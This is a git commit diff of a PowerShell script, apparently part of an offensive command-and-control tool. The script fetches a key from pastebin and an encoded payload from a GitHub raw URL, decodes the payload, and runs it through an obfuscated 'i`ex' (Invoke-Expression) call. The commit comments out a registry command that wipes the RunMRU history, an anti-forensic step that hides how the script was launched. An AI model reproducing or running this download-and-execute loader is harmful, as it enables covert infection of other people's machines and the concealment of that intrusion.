2543aebb4d19e1a5a11fbae34d1edfc8ce9521d0
egieb <93350544+beigeworm@users.noreply.github.com>
2024-04-01 16:32:16 +0000

    Update dcc2.ps1

--- dcc2.ps1
+++ dcc2.ps1
@@ -14,5 +14,5 @@ $k = irm "https://pastebin.com/raw/ySexKL9M"
 $t = irm "https://raw.githubusercontent.com/beigeworm/assets/main/escvrs"
 $isn = dojob -sec $t -bty $k
 
-reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+# reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
 $isn | i`ex
